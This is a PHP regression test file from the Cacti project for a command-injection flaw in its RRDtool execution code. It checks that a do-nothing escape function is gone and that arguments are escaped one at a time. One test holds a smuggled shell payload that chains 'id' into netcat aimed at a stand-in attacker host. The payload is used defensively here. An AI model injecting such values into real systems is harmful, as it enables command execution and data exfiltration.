<?php
declare(strict_types = 1);
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2026 The Cacti Group                                 |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

/**
 * Regression test for CVE-2026-40079 / GHSA-xq98-376r-hv9j.
 *
 * escape_command() returned its argument untouched, so all three calls in
 * __rrd_execute() read as a sanitising step that did nothing. RRDtool
 * arguments are escaped one at a time with cacti_escapeshellarg(); an
 * assembled command line cannot be escaped after the fact. The function and
 * its call sites are gone so no caller can mistake it for protection.
 *
 * @group regression
 */

$rrdPath = dirname(__DIR__, 4) . '/lib/rrd.php';

test('escape_command is gone from lib/rrd.php', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->not->toMatch('/function\s+escape_command\s*\(/');
	expect($source)->not->toMatch('/(?<![\w\$])escape_command\s*\(/');
});

test('escape_command is not redefined elsewhere under lib', function () {
	$found = [];

	foreach (glob(dirname(__DIR__, 4) . '/lib/*.php') as $file) {
		if (preg_match('/function\s+escape_command\s*\(/', file_get_contents($file))) {
			$found[] = basename($file);
		}
	}

	expect($found)->toBe([]);
});

test('__rrd_execute escapes array arguments one at a time', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->toContain("array_map('cacti_escapeshellarg', \$command)")
		->toContain('$command_line = rrdtool_build_command($command_line);');
});

test('local RRDtool execution never invokes a command shell', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->toContain("proc_open([\$path, '-']")
		->toContain("['bypass_shell' => true]")
		->not->toContain('shell_exec(')
		->not->toContain('popen(');
});

test('the pipe writer validates and converts each command before writing', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->toContain('$prepared_command = rrdtool_prepare_stdin_command($command_line);')
		->toContain('rrdtool_write_all($process->stdin, $prepared_command . "\n")');
});

test('per-argument escaping stops separators that a whole-command escape misses', function () {
	// The commented-out "real" escape_command() only stripped $ and backticks,
	// so the separators that actually chain a second process survived it.
	$payload = '/var/lib/rrd/x.rrd; id | nc attacker 1234';

	$stripped = preg_replace('/(\$|`)/', '', $payload);
	expect($stripped)->toContain('; id');
	expect($stripped)->toContain('| nc');

	// array_map('cacti_escapeshellarg', ...) is what __rrd_execute actually
	// applies, and it contains the whole payload in one argument.
	expect(escapeshellarg($payload))->toBe("'/var/lib/rrd/x.rrd; id | nc attacker 1234'");
});
